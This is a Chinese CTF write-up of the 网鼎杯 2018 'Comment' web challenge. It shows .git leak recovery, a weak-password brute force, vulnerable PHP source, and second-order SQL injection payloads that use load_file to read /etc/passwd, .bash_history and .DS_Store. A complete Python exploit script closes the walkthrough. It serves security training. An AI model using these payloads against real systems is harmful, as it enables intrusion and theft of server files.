---
title: 网鼎杯 2018 - Web - Comment
date: 2026-11-14 18:37:00
categories:
  - CTF
  - 网鼎杯 2018
  - Web
tags:
  - 二次注入
  - .git泄露
  - load_file
  - 弱口令
cover: /img/cover/backless-girl-magnolia.jpg
description: 网鼎杯 2018 Web 题，综合 .git 泄露、弱口令、二次注入与 load_file：addslashes 入库后反斜杠丢失，评论二次取出拼接注入，经 bash_history 与 .DS_Store 定位读 flag。
keywords:
  - Comment
  - 二次注入
  - .git泄露
  - load_file
  - DS_Store
ai: >-
  本题为网鼎杯 2018 的 Web 留言板题目。入口是一个可发帖、可留言的站点，发帖跳转登录页且登录框占位符提示用户名 zhangwei 与密码后三位未知，爆破后三位数字得到可用弱口令。目录扫描发现 .git 泄露，还原出 write_do.php 源码：write 分支写入时用 addslashes 转义，comment 分支却把从数据库取出的 category 未转义直接拼接进多行 insert 语句，形成典型的二次注入。因为 SQL 是多行格式，井号只能注释单行，需借助成对的多行注释把中间的引号与字段闭合掉。注入验证回显数据库名后，判断 flag 不在库而在本地文件，于是利用 root 权限的 load_file 读取 passwd 与 bash_history，得知站点部署路径，再用 hex 编码读取二进制 DS_Store 还原出带随机后缀的 flag 文件名，最后读取该 php 文件并解码得到 flag。全题是信息收集、源码审计、二次注入与文件读取的组合利用。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 网鼎杯 2018 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

考点：`.git 泄露` + `弱口令爆破` + `二次注入` + `load_file 读文件`。

## 信息收集

打开题目是一个留言板页面，有「发贴」和「留言」功能。点「发贴」会跳转到登录页，登录框 placeholder 提示用户名 `zhangwei`，密码 `zhangwei***`（后三位未知）。

目录扫描发现 `.git` 泄露：

```http
GET /.git/HEAD        HTTP/1.1   -> 200  ref: refs/heads/master
GET /.git/config      HTTP/1.1   -> 200
GET /.git/logs/HEAD   HTTP/1.1   -> 200
```

### 弱口令爆破

根据登录框提示 `zhangwei***`，爆破后三位纯数字，得到密码：

```text
用户名：zhangwei
密码：zhangwei666
```

### .git 泄露还原源码

下载 `.git` 目录后还原源码。当前 HEAD commit 的 tree 里只有 `write_do.php` 一个文件（源码被 reset 过），但 `git log --reflog` + `git reset --hard` 能还原完整源码。

核心源码 `write_do.php`：

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
    switch ($_GET['do']) {
        case 'write':
            $category = addslashes($_POST['category']);
            $title = addslashes($_POST['title']);
            $content = addslashes($_POST['content']);
            $sql = "insert into board
                        set category = '$category',
                            title = '$title',
                            content = '$content'";
            $result = mysql_query($sql);
            header("Location: ./index.php");
            break;
        case 'comment':
            $bo_id = addslashes($_POST['bo_id']);
            $sql = "select category from board where id='$bo_id'";
            $result = mysql_query($sql);
            $num = mysql_num_rows($result);
            if($num>0){
                $category = mysql_fetch_array($result)['category'];
                $content = addslashes($_POST['content']);
                $sql = "insert into comment
                            set category = '$category',
                                content = '$content',
                                bo_id = '$bo_id'";
                $result = mysql_query($sql);
            }
            header("Location: ./comment.php?id=$bo_id");
            break;
        default:
            header("Location: ./index.php");
    }
} else {
    header("Location: ./index.php");
}
?>
```

## 漏洞分析

### 二次注入

**漏洞点**：`comment` 分支中，`$category` 从数据库取出（`select category from board where id='$bo_id'`）后**未经转义**直接拼接到 SQL 中。

`write` 分支写入时虽然用 `addslashes()` 转义了单引号，但转义后的 `\'` 存入数据库后**反斜杠会被丢弃**，相当于没转义。所以第二次取出 `$category` 时形成二次注入。

关键 SQL 是**多行**格式：

```sql
insert into comment
    set category = '$category',
        content = '$content',
        bo_id = '$bo_id'
```

由于 SQL 中换行符存在，`#` 只能注释单行，所以使用 `/* ... */` 注释法闭合中间内容。

### 构造 payload

**发贴（write）**，category 字段注入：

```text
aa',content=database(),/*
```

**评论（comment）**，content 字段写：

```text
*/#
```

展开后 SQL 变为：

```sql
insert into comment
    set category = 'aa',content=database(),/*',
        content = '*/#',
        bo_id = '2'
```

`/*` 与 `*/` 配对注释掉中间的 `', content = '`，`#` 注释掉后面的 `', bo_id = '2'`，真正执行的 SQL 为：

```sql
insert into comment set category = 'aa',content=database(),#...
```

`database()` 结果回显在详情页的「留言」区域，得到数据库名 `ctf`，验证注入成功。

### load_file 读文件找 flag

题目给了 root 权限，说明 flag 不在数据库而在本地文件。

读 `/etc/passwd`：

```text
aa',content=(select load_file('/etc/passwd')),/*
```

发现 www 用户：`www:x:500:500:www:/home/www:/bin/bash`。

读 `/home/www/.bash_history`：

```text
aa',content=(select load_file('/home/www/.bash_history')),/*
```

得到历史命令：

```bash
cd /tmp/
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd /var/www/html/
rm -f .DS_Store
service apache2 start
```

读 `/tmp/html/.DS_Store`（二进制，用 hex 编码）：

```text
aa',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
```

hex 解码（`.DS_Store` 中是 UTF-16 编码的字符串）得到文件名：`flag_<随机后缀>.php`。

读 flag 文件：

```text
aa',content=(select hex(load_file('/var/www/html/flag_<随机后缀>.php'))),/*
```

hex 解码即可拿到文件中的 flag。

## 利用过程

1. 爆破弱口令登录 `zhangwei / zhangwei666`。
2. `.git` 泄露还原 `write_do.php`，审出二次注入点。
3. 发贴时 category 注入 `aa',content=(<注入SQL>),/*`，评论时 content 填 `*/#` 触发。
4. 用 `database()` 回显确认注入，再用 `load_file` 依次读 `/etc/passwd`、`.bash_history`、`.DS_Store`。
5. 由 `.DS_Store` 得到 flag 文件名，hex 读取并解码 flag。

## 完整 EXP

> 二次注入 payload 格式（来自归档）。

```text
# 发贴 category 字段（第一次写入，addslashes 后存库，反斜杠被清除）：
aa',content=(<注入SQL>),/*
# 评论 content 字段（第二次触发，配对注释）：
*/#

# 验证注入（database()）
发贴：title=inj&category=aa',content=database(),/*&content=cc
评论：content=*/#&bo_id=<帖子ID>
结果回显在详情页「留言」区域 -> 数据库名 ctf

# 读 /etc/passwd
category: aa',content=(select load_file('/etc/passwd')),/*
# 读 .bash_history
category: aa',content=(select load_file('/home/www/.bash_history')),/*
# 读 .DS_Store（二进制，需 hex）
category: aa',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
# 读 flag 文件
category: aa',content=(select hex(load_file('/var/www/html/flag_<随机后缀>.php'))),/*
```

完整 Python 脚本：

```python
# -*- coding: utf-8 -*-
import urllib.request, urllib.parse, sys, io, re, http.cookiejar, random
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='ignore')

base = "http://target:8080"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def get(path="/"):
    req = urllib.request.Request(base + path)
    r = opener.open(req, timeout=20)
    return r.status, r.read().decode('utf-8', 'ignore')

def post(path, data):
    d = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(base + path, data=d)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    r = opener.open(req, timeout=20)
    return r.status, r.read().decode('utf-8', 'ignore')

# 登录
post("/login.php", {"username": "zhangwei", "password": "zhangwei666"})

def inject(load_expr):
    """发贴 + 评论触发二次注入，返回详情页留言区内容"""
    title = "inj_%d" % random.randint(1000000, 9999999)
    category = "aa',content=(%s),/*" % load_expr
    post("/write_do.php?do=write", {"title": title, "category": category, "content": "cc"})
    s, body = get("/")
    rows = re.findall(r"<tr><td>(\d+)</td><td class='AutoNewline'>([^<]*)</td><td class='AutoNewline'>([^<]*)</td>", body)
    new_id = rows[-1][0]
    post("/write_do.php?do=comment", {"content": "*/#", "bo_id": new_id})
    s, body = get("/comment.php?id=%s" % new_id)
    ms = re.findall(r'<label[^>]*>留言</label>.*?<p>(.*?)</p>', body, re.S)
    return ms if ms else None

# 读 flag（文件名由 .DS_Store 还原得到）
r = inject("select hex(load_file('/var/www/html/flag_<随机后缀>.php'))")
print(r)
```

## Flag

脱敏后：`flag{xxxx}`。原值为 CTF2 格式，藏于 `/var/www/html/` 下带随机后缀的 php 文件，经 hex(load_file) 读取并解码得到。

## 踩坑与总结

1. **二次注入**：`addslashes()` 转义的值存入数据库后反斜杠被丢弃，第二次取出拼接时形成注入。
2. **多行 SQL 注释**：SQL 写成多行格式，`#` 只能注释单行，需用 `/* ... */` 配对注释。
3. **load_file 读二进制文件**：`.DS_Store` 是二进制文件，需用 `hex()` 编码后读取再解码（UTF-16）。
4. **信息收集**：`.bash_history` 泄露了历史命令，`.DS_Store` 泄露了目录文件名，是定位 flag 的关键。
5. 弱口令 `zhangwei666` 属于解题叙事凭据，可保留；真实基础设施信息一律脱敏。
